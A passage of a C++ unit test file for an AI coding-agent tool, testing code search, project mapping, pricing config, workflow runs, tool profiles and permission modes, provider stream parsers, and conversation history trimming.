      std::string gen = fs.execute(JSON::Object{ { "name", "genfunc" }, { "path", root } });
      check(gen.find("no definition") != std::string::npos, "find_symbol skips a gitignored file glob"); }

    { agent::tools::FindReferences fr;
      std::string keep = fr.execute(JSON::Object{ { "name", "keepfunc" }, { "path", root } });
      check(keep.find("keep.cpp") != std::string::npos, "find_references finds tracked usages");
      std::string skip = fr.execute(JSON::Object{ { "name", "skipfunc" }, { "path", root } });
      check(skip.find("no references") != std::string::npos, "find_references skips a gitignored dir"); }

    { agent::tools::ProjectMap pm;
      std::string map = pm.execute(JSON::Object{ { "path", root } });
      check(map.find("src/") != std::string::npos, "project_map lists tracked dirs");
      check(map.find("skipdir") == std::string::npos, "project_map omits a gitignored dir"); }

    { agent::tools::ListDirectory ld;
      std::string ls = ld.execute(JSON::Object{ { "path", root } });
      check(ls.find("skipdir") != std::string::npos, "list_directory still shows a gitignored dir");
      check(ls.find("gitignored") != std::string::npos, "list_directory marks it gitignored"); }

    std::filesystem::remove_all(root);
}

static void test_project_map() {
    std::cout << "project_map" << std::endl;
    std::string dir = "/tmp/ai_pm_test";
    std::filesystem::remove_all(dir);
    std::filesystem::create_directories(dir + "/src");
    std::filesystem::create_directories(dir + "/node_modules/pkg");
    { std::ofstream o(dir + "/package.json"); o << "{\"name\":\"demo\",\"scripts\":{\"build\":\"x\",\"test\":\"y\"},\"dependencies\":{\"a\":\"1\",\"b\":\"2\"}}"; }
    { std::ofstream o(dir + "/Makefile"); o << "all: build\nbuild:\n\tcc x\nobjs/x.o: x.c\n\tcc -c x\n.PHONY: all\n"; }
    { std::ofstream o(dir + "/src/main.cpp"); o << "int main(){}\n"; }
    { std::ofstream o(dir + "/src/util.cpp"); o << "\n"; }
    { std::ofstream o(dir + "/node_modules/pkg/index.js"); o << "// vendored\n"; }

    agent::tools::ProjectMap pm;
    std::string r = pm.execute(JSON::Object{ { "path", dir } });
    check(r.find("package.json") != std::string::npos && r.find("name \"demo\"") != std::string::npos, "parses package.json name");
    check(r.find("scripts: build, test") != std::string::npos && r.find("2 deps") != std::string::npos, "package.json scripts + deps");
    check(r.find("Makefile targets: all, build") != std::string::npos, "Makefile targets (object/phony filtered)");
    check(r.find("src/  (2 files)") != std::string::npos, "counts files per top-level dir");
    check(r.find("node_modules") == std::string::npos, "ignores vendored dirs");
    check(r.find("2 .cpp") != std::string::npos, "language histogram");

    std::filesystem::remove_all(dir);
}

static void test_find_references() {
    std::cout << "find_references (whole-word usage search)" << std::endl;
    std::string dir = "/tmp/ai_fr_test";
    std::filesystem::remove_all(dir);
    std::filesystem::create_directories(dir + "/objs");
    {
        std::ofstream o(dir + "/a.cpp");
        o << "int foo() { return 0; }\n"      // definition (also a reference)
             "int x = foo();\n"               // usage
             "int foobar = 1;\n"              // substring — NOT a match
             "// call foo then foo again\n";  // two whole-word hits on one line
    }
    { std::ofstream o(dir + "/objs/gen.cpp"); o << "foo();\n"; } // ignored dir

    agent::tools::FindReferences fr;
    std::string r = fr.execute(JSON::Object{ { "name", "foo" }, { "path", dir } });
    check(r.find("int foo()") != std::string::npos && r.find("x = foo()") != std::string::npos, "finds definition + usage");
    check(r.find("foobar") == std::string::npos, "excludes substring matches (foobar)");
    check(r.find("objs/gen") == std::string::npos, "skips ignored directories");
    check(r.find("4 references") != std::string::npos && r.find("on 3 lines") != std::string::npos, "counts references and lines");

    check(fr.execute(JSON::Object{ { "name", "nope_xyz" }, { "path", dir } }).find("no references") != std::string::npos, "reports nothing found");
    check(fr.execute(JSON::Object{ { "name", "bad name" }, { "path", dir } }).rfind("error:", 0) == 0, "rejects a non-identifier name");

    std::filesystem::remove_all(dir);
}

static void test_pricing_and_cost() {
    std::cout << "pricing + session cost" << std::endl;
    std::string path = "/tmp/ai_agent_pricing_test.conf";
    {
        std::ofstream ofd(path);
        ofd << "model: gpt-4o-mini\n";
        ofd << "price.gpt-4o-mini: 0.15/0.60\n";   // USD per million tokens
        ofd << "price.gpt-4o: 2.5/10\n";
        ofd << "budget_usd: 1.5\n";
        ofd << "budget_tokens: 100000\n";
    }
    agent::Config cfg;
    cfg.load(path);
    check(cfg.budget_usd == 1.5, "budget_usd parsed");
    check(cfg.budget_tokens == 100000, "budget_tokens parsed");

    auto p = cfg.pricing_for("gpt-4o-mini");
    check(p.has_value() && p->input_per_mtok == 0.15 && p->output_per_mtok == 0.60, "exact price match");

    // 1,000,000 input @ 0.15 + 500,000 output @ 0.60 = 0.15 + 0.30 = 0.45
    double cost = cfg.session_cost(1000000, 500000);
    check(cost > 0.4499 && cost < 0.4501, "session cost computed");

    // Substring match: a dated model name resolves to the base entry.
    cfg.model = "gpt-4o-2024-08-06";
    auto p2 = cfg.pricing_for(cfg.model);
    check(p2.has_value() && p2->input_per_mtok == 2.5, "substring price match (gpt-4o)");

    // Unknown / unpriced model -> negative (usage-only, e.g. a subscription).
    cfg.model = "claude-opus-4-8";
    check(cfg.session_cost(1000, 1000) < 0, "unpriced model returns -1");

    std::filesystem::remove(path);
}

static void test_project_instructions() {
    std::cout << "project instructions (AGENTS.md)" << std::endl;
    std::string dir = "/tmp/ai_agent_proj_test";
    std::filesystem::remove_all(dir);
    std::filesystem::create_directories(dir);

    check(agent::project_instructions_file(dir).empty(), "no file when none present");
    check(agent::load_project_instructions(dir).empty(), "empty block when none present");
    check(agent::load_project_memory(dir).empty(), "no project memory when none present");
    check(agent::load_project_roadmap(dir).empty(), "no roadmap when none present");

    {
        std::ofstream ofd(dir + "/AGENTS.md");
        ofd << "Use tabs. Run make test before finishing.\n";
    }
    check(agent::project_instructions_file(dir) == "AGENTS.md", "AGENTS.md detected");
    std::string block = agent::load_project_instructions(dir);
    check(block.find("Use tabs. Run make test") != std::string::npos, "content included");
    check(block.find("Project instructions (from AGENTS.md)") != std::string::npos, "block is labelled");

    { std::ofstream ofd(dir + "/MEMORY.md"); ofd << "Build uses the C++17 profile.\n"; }
    { std::ofstream ofd(dir + "/ROADMAP.md"); ofd << "- Add diagnostics\n"; }
    check(agent::load_project_memory(dir).find("Build uses the C++17") != std::string::npos,
          "project MEMORY.md is loaded");
    check(agent::load_project_roadmap(dir).find("Add diagnostics") != std::string::npos,
          "ROADMAP.md is available on request");

    // AGENTS.md wins over .ai-agent.md when both exist.
    {
        std::ofstream ofd(dir + "/.ai-agent.md");
        ofd << "secondary\n";
    }
    check(agent::project_instructions_file(dir) == "AGENTS.md", "AGENTS.md has priority");

    // Falls back to .ai-agent.md when AGENTS.md is absent.
    std::filesystem::remove(dir + "/AGENTS.md");
    check(agent::project_instructions_file(dir) == ".ai-agent.md", "falls back to .ai-agent.md");

    std::filesystem::remove_all(dir);
}

static void test_workflow_manager() {
    std::cout << "workflow manager (background runs)" << std::endl;
    agent::WorkflowManager mgr;

    std::atomic<int> calls{ 0 };
    auto runner = [&calls](const std::string& task, std::atomic<bool>* abort) -> std::string {
        (void)abort;
        calls.fetch_add(1);
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
        return "result for: " + task;
    };

    int id = mgr.launch("scan", { "step one", "step two", "step three" }, runner);
    check(id >= 1, "launch returns a run id");

    // Wait for completion (bounded).
    for ( int i = 0; i < 200 && mgr.any_running(); ++i )
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    check(!mgr.any_running(), "run finishes");
    check(calls.load() == 3, "every step ran once");

    auto runs = mgr.snapshot();
    check(runs.size() == 1 && runs[0].status == "done", "run marked done");
    check(runs[0].steps.size() == 3 && runs[0].steps[2].status == "done", "all steps done");
    check(runs[0].steps[0].result == "result for: step one", "step result captured");

    auto undelivered = mgr.take_undelivered();
    check(undelivered.size() == 1, "finished run delivered once");
    check(mgr.take_undelivered().empty(), "not delivered twice");

    // An erroring step stops the run and marks it error.
    auto bad = [](const std::string&, std::atomic<bool>*) -> std::string { return "error: boom"; };
    int id2 = mgr.launch("bad", { "a", "b" }, bad);
    (void)id2;
    for ( int i = 0; i < 200 && mgr.any_running(); ++i )
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    auto runs2 = mgr.snapshot();
    check(runs2.back().status == "error", "erroring step marks the run error");
    check(runs2.back().steps[1].status == "pending", "later steps skipped after an error");
}

static void test_workflow_tool() {
    std::cout << "workflow tool schema/execute" << std::endl;
    std::string got_name;
    std::vector<std::string> got_steps;
    bool got_parallel = false;
    agent::tools::WorkflowTool tool([&](const std::string& n, const std::vector<std::string>& s, bool p) {
        got_name = n; got_steps = s; got_parallel = p; return std::string("started workflow #7");
    });
    check(tool.name() == "run_workflow", "workflow tool name");
    std::string r = tool.execute(JSON::Object{
        { "name", "scan" },
        { "steps", JSON::Array{ "look at a", "look at b" } }
    });
    check(got_name == "scan" && got_steps.size() == 2, "launcher gets name + steps");
    check(!got_parallel, "parallel defaults to false");
    check(r == "started workflow #7", "returns launcher message");
    tool.execute(JSON::Object{
        { "steps", JSON::Array{ "a", "b" } }, { "parallel", true } });
    check(got_parallel, "parallel flag forwarded");
    check(tool.execute(JSON::Object{ { "name", "x" } }).rfind("error:", 0) == 0,
          "missing steps is an error");
}

static void test_workflow_autoresume() {
    std::cout << "workflow autoresume (enqueue cap + config round-trip)" << std::endl;

    // The chain guard: at most 2 auto prompts join the queue per user message.
    agent::Config cfg;
    agent::Conversation conv;
    agent::TokenStats stats;
    agent::InlineRepl repl(nullptr, cfg, conv, stats);
    check(repl.enqueue_prompt("auto 1"), "first auto prompt accepted");
    check(repl.enqueue_prompt("auto 2"), "second auto prompt accepted");
    check(!repl.enqueue_prompt("auto 3"), "third auto prompt dropped by the chain guard");

    // Config: file key + state.json settings round-trip.
    std::string p = "/tmp/ai_war_cfg";
    { std::ofstream o(p); o << "workflow_autoresume: on\n"; }
    agent::Config c2;
    c2.load(p);
    check(c2.workflow_autoresume, "config key parses (on)");
    std::filesystem::remove(p);

    std::string home = "/tmp/ai_war_home";
    std::filesystem::remove_all(home);
    std::filesystem::create_directories(home);
    c2.home_dir = home;
    c2.save_settings(home);
    agent::Config c3;
    c3.apply_settings(agent::Config::load_last_used(home));
    check(c3.workflow_autoresume, "workflow_autoresume survives state.json round-trip");
    std::filesystem::remove_all(home);
}

static void test_tool_mode_persistence() {
    std::cout << "tool mode persistence (save/apply + CLI-flag guard)" << std::endl;
    std::string home = "/tmp/ai_toolmode_home";
    std::filesystem::remove_all(home);
    std::filesystem::create_directories(home);

    // auto (confirm_tools=false) round-trips through state.json.
    agent::Config saver;
    saver.home_dir = home;
    saver.confirm_tools = false;
    saver.insecure = false;
    saver.save_settings(home);
    agent::Config loader;
    loader.apply_settings(agent::Config::load_last_used(home));
    check(!loader.confirm_tools && !loader.insecure, "auto mode survives the round-trip");

    // insecure round-trips too.
    saver.confirm_tools = true;
    saver.insecure = true;
    saver.save_settings(home);
    agent::Config loader2;
    loader2.apply_settings(agent::Config::load_last_used(home));
    check(loader2.insecure, "insecure mode survives the round-trip");

    // A CLI flag (tool_mode_explicit) wins over the saved mode AND is not written
    // back over it. Saved = insecure; this session was launched --yes-tools (auto).
    agent::Config cli;
    cli.home_dir = home;
    cli.confirm_tools = false; // -Y
    cli.insecure = false;
    cli.tool_mode_explicit = true;
    cli.apply_settings(agent::Config::load_last_used(home)); // must NOT flip to insecure
    check(!cli.insecure && !cli.confirm_tools, "explicit CLI mode not overridden by saved state");
    cli.save_settings(home); // must NOT clobber the saved insecure preference
    agent::Config after;
    after.apply_settings(agent::Config::load_last_used(home));
    check(after.insecure, "saved mode preserved when the session mode came from a CLI flag");

    std::filesystem::remove_all(home);
}

static void test_workflow_parallel_cancel_retry() {
    std::cout << "workflow parallel / cancel / retry / on_finish" << std::endl;
    using namespace std::chrono_literals;

    // Parallel: three 120ms steps should overlap (well under 3x serial time).
    {
        agent::WorkflowManager mgr;
        auto t0 = std::chrono::steady_clock::now();
        mgr.launch("par", { "a", "b", "c" }, [](const std::string&, std::atomic<bool>*) {
            std::this_thread::sleep_for(std::chrono::milliseconds(120));
            return std::string("ok");
        }, true);
        while ( mgr.any_running()) std::this_thread::sleep_for(5ms);
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - t0).count();
        check(ms < 300, "parallel steps overlap (took " + std::to_string(ms) + "ms)");
        check(mgr.snapshot().back().status == "done", "parallel run completes");
        check(mgr.snapshot().back().parallel, "run records parallel mode");
    }

    // Parallel keeps going after one step errors; run still marked error.
    {
        agent::WorkflowManager mgr;
        mgr.launch("parerr", { "bad", "good" }, [](const std::string& t, std::atomic<bool>*) {
            return t == "bad" ? std::string("error: nope") : std::string("fine");
        }, true);
        while ( mgr.any_running()) std::this_thread::sleep_for(5ms);
        auto r = mgr.snapshot().back();
        check(r.status == "error", "parallel run with a failed step is error");
        bool good_done = false;
        for ( const auto& s : r.steps ) if ( s.result == "fine" ) good_done = true;
        check(good_done, "other parallel steps still ran");
    }

    // Cancel: a long step observes the per-run abort flag.
    {
        agent::WorkflowManager mgr;
        int id = mgr.launch("slow", { "s1", "s2" }, [](const std::string&, std::atomic<bool>* ab) {
            for ( int i = 0; i < 200; ++i ) {
                if ( ab && ab->load()) return std::string("cancelled");
                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            return std::string("ok");
        });
        std::this_thread::sleep_for(30ms);
        check(mgr.cancel(id), "cancel accepts a running id");
        while ( mgr.any_running()) std::this_thread::sleep_for(5ms);
        check(mgr.snapshot().back().status == "cancelled", "cancelled run status");
        check(!mgr.cancel(id), "cancel refuses a finished id");
        check(!mgr.cancel(999), "cancel refuses an unknown id");
    }

    // Retry: succeeded steps are kept and skipped; failed ones run again.
    {
        agent::WorkflowManager mgr;
        std::atomic<int> calls{ 0 };
        int fail_once = 1;
        int id = mgr.launch("retryme", { "a", "b" },
            [&](const std::string& t, std::atomic<bool>*) {
                calls++;
                if ( t == "b" && fail_once ) return std::string("error: transient");
                return std::string("ok:" + t);
            });
        while ( mgr.any_running()) std::this_thread::sleep_for(5ms);
        check(mgr.snapshot().back().status == "error", "first run errors");
        int before = calls.load();
        fail_once = 0;
        int nid = mgr.retry(id, [&](const std::string& t, std::atomic<bool>*) {
            calls++;
            return std::string("ok:" + t);
        });
        check(nid > id, "retry returns a new id");
        while ( mgr.any_running()) std::this_thread::sleep_for(5ms);
        auto runs = mgr.snapshot();
        check(runs.back().status == "done", "retried run completes");
        check(runs.back().steps[0].result == "ok:a", "succeeded step result kept");
        check(calls.load() == before + 1, "only the failed step re-ran");
        check(mgr.retry(nid, nullptr) == -1, "retry refuses a fully-succeeded run");
    }

    // on_finish fires with the final snapshot.
    {
        agent::WorkflowManager mgr;
        std::atomic<bool> fired{ false };
        std::string got;
        mgr.set_on_finish([&](const agent::WorkflowRun& r) { got = r.status; fired = true; });
        mgr.launch("notify", { "x" }, [](const std::string&, std::atomic<bool>*) {
            return std::string("ok");
        });
        for ( int i = 0; i < 200 && !fired; ++i ) std::this_thread::sleep_for(5ms);
        check(fired.load() && got == "done", "on_finish fired with final status");
        mgr.set_on_finish(nullptr);
    }
}

static void test_provider_options_config() {
    std::cout << "provider options config" << std::endl;
    std::string path = "/tmp/ai_agent_provider_options_test.conf";
    std::ofstream ofd(path);
    ofd << "provider.kimi.model: kimi-k2\n";
    ofd.close();

    agent::Config cfg;
    cfg.load(path);
    check(cfg.provider_options.find("kimi") != cfg.provider_options.end(), "provider_options has kimi");
    check(cfg.provider_options["kimi"].contains("model"), "kimi options has model");
    check(cfg.provider_options["kimi"]["model"].to_string() == "kimi-k2", "kimi model option loaded");

    std::filesystem::remove(path);
}

static void test_claude_provider() {
    std::cout << "claude provider" << std::endl;
    agent::Config cfg;
    agent::providers::Claude claude(cfg);
    check(claude.name() == "claude", "claude provider name");
    check(claude.endpoint() == "https://api.anthropic.com/v1/messages", "claude inherits anthropic endpoint");
    // Claude Code authenticates with the OAuth access token as a Bearer
    // credential, NOT an Anthropic API key — using x-api-key would bill the
    // pay-as-you-go API instead of the subscription.
    check(claude.auth_header() == "Authorization", "claude uses OAuth bearer auth header");

    bool has_oauth_beta = false;
    for ( const auto& h : claude.extra_headers()) {
        if ( h.first == "anthropic-beta" && h.second == "oauth-2025-04-20" )
            has_oauth_beta = true;
    }
    check(has_oauth_beta, "claude sends the oauth beta header");
}

static void test_claude_pkce() {
    std::cout << "claude pkce" << std::endl;
    auto pkce = agent::auth::generate_pkce();
    check(pkce.verifier.size() == 128, "pkce verifier length");
    check(!pkce.challenge.empty(), "pkce challenge present");
    check(pkce.challenge.find('+') == std::string::npos && pkce.challenge.find('/') == std::string::npos && pkce.challenge.find('=') == std::string::npos,
          "pkce challenge is base64url");
}

static void test_stream_parsers() {
    std::cout << "stream parsers" << std::endl;
    agent::Config cfg;

    agent::providers::OpenAI openai(cfg);
    openai.stream_reset();
    std::string buf;
    bool done = false;
    // Kimi sends "data:" with no space on chunks (but a space on [DONE]) and
    // puts usage inside choices[0] on the final chunk.
    auto oc = openai.parse_stream("data:{\"choices\":[{\"delta\":{\"content\":\"Hello\"},\"usage\":{\"prompt_tokens\":3,\"completion_tokens\":1}}]}\n\ndata: [DONE]\n\n", buf, done);
    check(oc.content == "Hello" && done, "openai stream parser (no space after data:)");
    check(openai.stream_result().input_tokens == 3, "usage captured from choices[0].usage");

    agent::providers::Ollama ollama(cfg);
    ollama.stream_reset();
    buf.clear(); done = false;
    // Ollama's native /api/chat streams newline-delimited JSON (not SSE).
    auto olc = ollama.parse_stream("{\"message\":{\"content\":\"world\"}}\n{\"done\":true}\n", buf, done);
    check(olc.content == "world" && done, "ollama stream parser (NDJSON)");
    // A JSON object split across two chunks must still parse once completed.
    ollama.stream_reset(); buf.clear(); done = false;
    ollama.parse_stream("{\"message\":{\"content\":\"par", buf, done);
    auto olc2 = ollama.parse_stream("tial\"}}\n{\"done\":true}\n", buf, done);
    check(olc2.content == "partial" && done, "ollama NDJSON reassembles a split object");

    agent::providers::Anthropic anthropic(cfg);
    anthropic.stream_reset();
    buf.clear(); done = false;
    auto ac = anthropic.parse_stream(
        "event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"!\"}}\n\n"
        "event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n", buf, done);
    check(ac.content == "!" && done, "anthropic stream parser");
}

static void test_stream_tool_calls() {
    std::cout << "streamed tool calls" << std::endl;
    agent::Config cfg;
    std::string buf;
    bool done = false;

    // OpenAI: a tool call fragmented across two deltas (arguments accumulate).
    agent::providers::OpenAI o(cfg);
    o.stream_reset();
    o.parse_stream(R"(data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_1","function":{"name":"read_file","arguments":"{\"path\":"}}]}}]})"
                   "\n\n", buf, done);
    o.parse_stream(R"(data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\"a.txt\"}"}}]}}]})"
                   "\n\ndata: [DONE]\n\n", buf, done);
    auto ro = o.stream_result();
    check(ro.tool_calls.size() == 1, "openai: one tool call assembled");
    check(!ro.tool_calls.empty() && ro.tool_calls[0].name == "read_file", "openai: tool name");
    check(!ro.tool_calls.empty() && ro.tool_calls[0].arguments["path"].to_string() == "a.txt",
          "openai: arguments assembled from fragments");

    // Anthropic: tool_use block with input_json_delta fragments + a thinking block.
    agent::providers::Anthropic a(cfg);
    a.stream_reset();
    buf.clear(); done = false;
    a.parse_stream(R"(data: {"type":"content_block_start","index":0,"content_block":{"type":"thinking"}})""\n\n", buf, done);
    a.parse_stream(R"(data: {"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"hmm"}})""\n\n", buf, done);
    a.parse_stream(R"(data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"tu_1","name":"grep"}})""\n\n", buf, done);
    a.parse_stream(R"(data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"pattern\":\"x\"}"}})""\n\n", buf, done);
    auto ra = a.stream_result();
    check(ra.thinking == "hmm", "anthropic: thinking accumulated");
    check(ra.tool_calls.size() == 1 && ra.tool_calls[0].name == "grep", "anthropic: tool_use assembled");
    check(!ra.tool_calls.empty() && ra.tool_calls[0].arguments["pattern"].to_string() == "x", "anthropic: input json assembled");
}

static void test_tools() {
    std::cout << "tools" << std::endl;
    agent::tools::Registry r;
    r.register_defaults();
    r.set_confirm_callback([](const agent::tools::ConfirmRequest&, std::string&) { return agent::tools::Decision::once; });

    JSON write = JSON::Object{
        { "path", "/tmp/ai_agent_tool_test.txt" },
        { "content", "hello tools" }
    };
    std::string w = r.execute("write_file", write);
    check(w.find("ok") != std::string::npos, "write_file");

    JSON read = JSON::Object{{ "path", "/tmp/ai_agent_tool_test.txt" }};
    std::string re = r.execute("read_file", read);
    check(re == "hello tools", "read_file");

    JSON run = JSON::Object{{ "command", "echo tool_ok" }};
    std::string ru = r.execute("run_command", run);
    check(ru.find("tool_ok") != std::string::npos, "run_command");

    JSON grep = JSON::Object{
        { "path", "/tmp/ai_agent_tool_test.txt" },
        { "pattern", "tools" }
    };
    std::string g = r.execute("grep", grep);
    check(g.find("tools") != std::string::npos, "grep");

    std::filesystem::remove("/tmp/ai_agent_tool_test.txt");
}

static void test_tool_groups() {
    std::cout << "tool groups filtering" << std::endl;
    agent::tools::Registry r;
    r.register_defaults();
    r.add(std::make_unique<agent::tools::WebSearch>("https://example.com"));
    r.add(std::make_unique<agent::tools::FetchUrl>());
    r.add(std::make_unique<agent::tools::WorkflowTool>(nullptr));
    r.add(std::make_unique<agent::tools::SkillTool>(nullptr, nullptr));

    r.apply_profile("full");
    check(r.is_group_enabled("core"), "core enabled in full");
    check(r.is_group_enabled("web"), "web enabled in full");
    check(r.is_group_enabled("workflow"), "workflow enabled in full");
    check(r.is_group_enabled("skills"), "skills enabled in full");
    check(r.disabled_groups().empty(), "no disabled groups in full profile");

    auto has_tool = [](const JSON& s, const std::string& name) {
        for ( size_t i = 0; i < s.size(); ++i ) {
            if ( s[i].contains("function") && s[i]["function"].contains("name") ) {
                if ( s[i]["function"]["name"].to_string() == name ) return true;
            }
        }
        return false;
    };

    JSON full_schema = r.schema();
    check(has_tool(full_schema, "read_file"), "read_file present");
    check(has_tool(full_schema, "web_search"), "web_search present in full schema");
    check(has_tool(full_schema, "fetch_url"), "fetch_url present in full schema");
    check(has_tool(full_schema, "run_workflow"), "run_workflow present in full schema");
    check(has_tool(full_schema, "use_skill"), "use_skill present in full schema");

    r.set_group_enabled("web", false);
    check(!r.is_group_enabled("web"), "web is now disabled");
    check(r.disabled_groups().count("web") == 1, "web in disabled_groups set");

    JSON filtered = r.schema();
    check(has_tool(filtered, "read_file"), "read_file still present when web disabled");
    check(!has_tool(filtered, "web_search"), "web_search omitted when web disabled");
    check(!has_tool(filtered, "fetch_url"), "fetch_url omitted when web disabled");
    check(has_tool(filtered, "run_workflow"), "run_workflow still present");

    r.set_group_enabled("workflow", false);
    r.set_group_enabled("skills", false);
    JSON filtered2 = r.schema();
    check(!has_tool(filtered2, "run_workflow"), "run_workflow omitted");
    check(!has_tool(filtered2, "use_skill"), "use_skill omitted");
    check(has_tool(filtered2, "read_file"), "core read_file still present");

    r.set_group_enabled("web", true);
    r.set_group_enabled("workflow", true);
    r.set_group_enabled("skills", true);
    JSON restored = r.schema();
    check(has_tool(restored, "web_search"), "web_search restored");
    check(has_tool(restored, "fetch_url"), "fetch_url restored");
    check(has_tool(restored, "run_workflow"), "run_workflow restored");
    check(has_tool(restored, "use_skill"), "use_skill restored");
    check(r.disabled_groups().empty(), "disabled_groups empty after restoring");
}

static void test_tool_profiles() {
    std::cout << "tool profiles and dynamic selection" << std::endl;
    agent::tools::Registry r;
    r.register_defaults();
    r.add(std::make_unique<agent::tools::WebSearch>("https://example.com"));
    r.add(std::make_unique<agent::tools::FetchUrl>());
    r.add(std::make_unique<agent::tools::WorkflowTool>(nullptr));
    r.add(std::make_unique<agent::tools::SkillTool>(nullptr, nullptr));

    check(r.active_profile() == "code", "default profile is code");
    check(!r.is_group_enabled("web"), "web group disabled in default code profile");
    check(!r.is_group_enabled("workflow"), "workflow group disabled in default code profile");
    auto profiles = agent::tools::Registry::available_profiles();
    check(profiles.size() == 5, "5 profiles available");

    check(r.apply_profile("full"), "apply_profile full succeeds");
    check(r.active_profile() == "full", "active profile is full");
    check(r.is_group_enabled("web"), "web group enabled in full profile");
    check(r.is_group_enabled("workflow"), "workflow group enabled in full profile");

    check(r.apply_profile("code"), "apply_profile code succeeds");
    check(r.active_profile() == "code", "active profile is code");
    check(!r.is_group_enabled("web"), "web group disabled in code profile");
    check(!r.is_group_enabled("workflow"), "workflow group disabled in code profile");
    check(r.is_group_enabled("core"), "core group enabled in code profile");
    check(!r.plan_mode(), "plan mode is off in code profile");

    check(r.apply_profile("research"), "apply_profile research succeeds");
    check(r.active_profile() == "research", "active profile is research");
    check(r.is_group_enabled("web"), "web group enabled in research profile");
    check(r.plan_mode(), "plan mode is on in research profile");
    check(!r.is_tool_enabled("write_file"), "write_file disabled in research profile");
    check(!r.is_tool_enabled("edit_file"), "edit_file disabled in research profile");
    check(r.is_tool_enabled("read_file"), "read_file enabled in research profile");

    JSON wargs = JSON::Object{{ "path", "/tmp/ai_agent_profile_test.txt" }, { "content", "x" }};
    std::string wres = r.execute("write_file", wargs);
    check(wres.find("disabled") != std::string::npos, "executing disabled tool returns error");

    check(r.apply_profile("review"), "apply_profile review succeeds");
    check(r.active_profile() == "review", "active profile is review");
    check(!r.is_group_enabled("web"), "web disabled in review profile");
    check(r.plan_mode(), "plan mode is on in review profile");
    check(!r.is_tool_enabled("write_file"), "write_file disabled in review profile");
    check(r.is_tool_enabled("read_file"), "read_file enabled in review profile");

    check(r.apply_profile("minimal"), "apply_profile minimal succeeds");
    check(r.active_profile() == "minimal", "active profile is minimal");
    check(r.is_tool_enabled("read_file"), "read_file enabled in minimal");
    check(r.is_tool_enabled("edit_file"), "edit_file enabled in minimal");
    check(r.is_tool_enabled("run_command"), "run_command enabled in minimal");
    check(!r.is_tool_enabled("write_file"), "write_file disabled in minimal");
    check(!r.is_tool_enabled("list_directory"), "list_directory disabled in minimal");

    check(r.apply_profile("full"), "apply_profile full succeeds");
    check(r.active_profile() == "full", "active profile is full");
    check(r.is_tool_enabled("write_file"), "write_file enabled in full");
    check(r.is_group_enabled("web"), "web enabled in full");

    auto tools = r.list_tools();
    check(!tools.empty(), "list_tools returns tools");
    check(tools[0].schema_tokens > 0, "tool schema tokens estimated");
}

static void test_mcp_server_toggle() {
    std::cout << "mcp server enable/disable" << std::endl;
    agent::mcp::Client mcp;
    check(!mcp.set_server_enabled("nonexistent", false), "set_server_enabled returns false for nonexistent");
    check(!mcp.is_server_enabled("nonexistent"), "is_server_enabled returns false for nonexistent");
}

static void test_expand_tilde() {
    std::cout << "tilde expansion" << std::endl;
    setenv("HOME", "/home/tester", 1);
    check(agent::Config::expand_tilde("~/x") == "/home/tester/x", "~/ expands to HOME");
    check(agent::Config::expand_tilde("~") == "/home/tester", "bare ~ expands to HOME");
    check(agent::Config::expand_tilde("/abs") == "/abs", "absolute path unchanged");
    check(agent::Config::expand_tilde("rel/p") == "rel/p", "relative path unchanged");
}

static void test_conversation_undo() {
    std::cout << "conversation undo" << std::endl;
    agent::Conversation c;
    c.set_system("sys");
    c.add_user("q1"); c.add_assistant("a1");
    c.add_user("q2"); c.add_assistant("a2");

    check(c.undo_last() == "q2", "undo returns the last user message");
    check(c.messages().size() == 3, "undo removes the last exchange");
    check(c.undo_last() == "q1", "undo again returns the prior user message");
    check(c.undo_last().empty(), "undo on empty history returns empty");
}

static void test_context_budget() {
    std::cout << "context token budget" << std::endl;
    agent::Conversation c;
    c.set_system(std::string(400, 's')); // ~100 tokens
    for ( int i = 0; i < 20; ++i )
        c.add_user(std::string(400, 'u')); // ~100 tokens each

    check(c.within_token_budget(0).size() == c.messages().size(), "budget 0 keeps everything");

    auto trimmed = c.within_token_budget(400); // system + a few recent messages
    check(trimmed.size() < c.messages().size(), "budget trims older messages");
    check(trimmed.front().role == agent::Role::SYSTEM, "system message is kept");
    check(!trimmed.empty() && trimmed.back().content == std::string(400, 'u'), "newest message is kept");

    auto tiny = c.within_token_budget(1); // still keeps system + latest
    check(tiny.size() >= 2 && tiny.front().role == agent::Role::SYSTEM, "tiny budget keeps system + latest");
}

static void test_trim_role_invariants() {
    std::cout << "trim keeps a valid user-first, non-degrading suffix" << std::endl;
    using agent::Role;
    agent::Conversation c;
    c.set_system(std::string(400, 's'));
    // Alternating user/assistant history that overflows the budget.
    for ( int i = 0; i < 30; ++i ) {
        c.add_user(std::string(400, 'u'));
        c.add_assistant(std::string(400, 'a'));
    }
    auto t = c.within_token_budget(2000);
    check(t.front().role == Role::SYSTEM, "system first");
    check(t.size() >= 2 && t[1].role == Role::USER, "first non-system message is a USER turn (Anthropic-valid)");
    check(t.size() < c.messages().size(), "history was actually trimmed");

    // Shrink under the pin (undo removes recent turns) must not degrade the next
    // request to system-only — the newest message must survive.
    for ( int i = 0; i < 25; ++i )
        c.undo_last();
    auto s = c.within_token_budget(2000);
    check(s.size() >= 2, "after a big shrink the request is not just the system message");
    check(s.back().role == Role::USER || s.back().role == Role::ASSISTANT, "newest message survives the shrink");
    check(s[1].role == Role::USER, "first non-system message is still a USER turn after shrink");
}

static void test_tool_supersession() {
    std::cout << "tool-result supersession" << std::endl;
    using agent::Message; using agent::Role; using agent::ToolCall;
    std::string big(400, 'X'); // over the 120-char elision threshold

    auto assistant = [](const std::string& id, const std::string& tool, const std::string& args) {
        Message m(Role::ASSISTANT, "");
        m.tool_calls.push_back(ToolCall{ id, tool, args });
        return m;
    };
    auto result = [&](const std::string& id, const std::string& body) {
        return Message(Role::TOOL, body, id, "tool");
    };

    std::vector<Message> msgs = {
